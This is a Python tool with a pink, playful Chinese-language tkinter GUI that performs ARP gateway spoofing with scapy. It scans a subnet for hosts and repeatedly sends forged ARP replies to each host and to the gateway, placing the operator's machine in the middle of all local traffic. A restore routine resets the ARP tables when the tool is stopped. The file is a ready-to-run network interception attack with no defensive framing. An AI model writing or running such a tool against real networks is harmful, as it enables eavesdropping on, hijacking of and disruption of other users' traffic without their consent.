# ------------------------------
# Lv.7 病嬌美化強化版：ARP Gateway Spoof + 完整 GUI + 還原機制
# ------------------------------
import tkinter as tk
from tkinter import messagebox
import threading
import scapy.all as scapy
import time
from datetime import datetime
import re


# ------------------------------
# 工具函數
# ------------------------------
def get_my_ip():
    return scapy.get_if_addr(scapy.conf.iface)


def valid_ip(ip):
    return re.match(r"^(\d{1,3}\.){3}\d{1,3}$", ip)


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request
    answered = scapy.srp(packet, timeout=2, verbose=0)[0]
    if answered:
        return answered[0][1].hwsrc
    return None


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        return
    eth = scapy.Ether(dst=target_mac)
    arp = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    packet = eth / arp
    scapy.sendp(packet, verbose=False)


def restore(target_ip, real_ip):
    target_mac = get_mac(target_ip)
    real_mac = get_mac(real_ip)
    if not target_mac or not real_mac:
        return
    packet = scapy.ARP(
        op=2, pdst=target_ip, hwdst=target_mac, psrc=real_ip, hwsrc=real_mac
    )
    scapy.send(packet, count=3, verbose=False)


def scan_hosts(subnet):
    arp = scapy.ARP(pdst=subnet)
    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    result = scapy.srp(ether / arp, timeout=2, verbose=0)[0]
    return [rcv.psrc for snd, rcv in result if rcv.psrc != get_my_ip()]


def log(msg):
    timestamp = datetime.now().strftime("%H:%M:%S")
    text_log.config(state="normal")
    text_log.insert("end", f"[{timestamp}] {msg}\n")
    text_log.see("end")
    text_log.config(state="disabled")


# ------------------------------
# 控制區
# ------------------------------
running = False
hosts = []
packet_count = 0


def start():
    global running, hosts, packet_count
    subnet = entry_subnet.get().strip()
    gw_ip = entry_gw.get().strip()

    if "/" not in subnet or not valid_ip(gw_ip):
        messagebox.showerror(
            "輸入錯誤喔♡",
            "主人請輸入正確格式：\n🌐 網段如 192.168.69.0/24\n💓 Gateway 如 192.168.69.1",
        )
        return

    running = True
    packet_count = 0
    hosts = scan_hosts(subnet)
    btn_start.config(state="disabled")
    entry_subnet.config(state="disabled")
    entry_gw.config(state="disabled")
    status_label.config(text=f"🎯 找到 {len(hosts)} 台主機，開始偽裝中...♡")
    log(f"✨ 掃描完成，找到 {len(hosts)} 台主機喔 主人～")

    def loop():
        global packet_count
        while running:
            for ip in hosts:
                spoof(ip, gw_ip)
                spoof(gw_ip, ip)
                packet_count += 2
            progress_var.set(packet_count % 100)
            status_label.config(text=f"🎭 Spoofing中♡ 封包數：{packet_count}")
            time.sleep(2)

    threading.Thread(target=loop, daemon=True).start()


def stop():
    global running
    running = False
    time.sleep(1)
    for ip in hosts:
        restore(ip, entry_gw.get())
        restore(entry_gw.get(), ip)
    btn_start.config(state="normal")
    entry_subnet.config(state="normal")
    entry_gw.config(state="normal")
    status_label.config(text="✅ Spoofing 停止了喔♡")
    log("🛑 已停止並還原 ARP，主人的網路不會亂掉了呢♡")


# ------------------------------
# GUI 美化版
# ------------------------------
app = tk.Tk()
app.title("Lv.7 病嬌網段 Spoof 工具♡")
app.geometry("520x560")
app.configure(bg="#fff0f5")

font_main = ("Arial", 12)

tk.Label(
    app, text="🌐 請輸入掃描的網段 (例: 192.168.69.0/24)", bg="#fff0f5", font=font_main
).pack(pady=5)
entry_subnet = tk.Entry(app, font=font_main)
entry_subnet.insert(0, "192.168.69.0/24")
entry_subnet.pack(pady=5)

tk.Label(app, text="🎭 偽裝的 Gateway IP", bg="#fff0f5", font=font_main).pack(pady=5)
entry_gw = tk.Entry(app, font=font_main)
entry_gw.insert(0, get_my_ip())
entry_gw.pack(pady=5)

btn_start = tk.Button(
    app,
    text="▶ 開始 Spoofing♡",
    command=start,
    bg="#ff69b4",
    fg="white",
    font=("Arial", 11, "bold"),
)
btn_start.pack(pady=10)

tk.Button(
    app,
    text="■ 停止並還原",
    command=stop,
    bg="#6a5acd",
    fg="white",
    font=("Arial", 11, "bold"),
).pack(pady=5)

status_label = tk.Label(app, text="狀態：尚未啟動喔♡", bg="#fff0f5", font=("Arial", 11))
status_label.pack(pady=10)

progress_var = tk.IntVar()
progress = tk.Scale(
    app,
    variable=progress_var,
    from_=0,
    to=100,
    orient="horizontal",
    length=400,
    state="disabled",
    bg="#fff0f5",
)
progress.pack(pady=5)

text_log = tk.Text(app, height=15, font=("Consolas", 10), bg="#fffafc")
text_log.pack(padx=20, pady=10, fill="both", expand=True)
text_log.config(state="disabled")

app.mainloop()
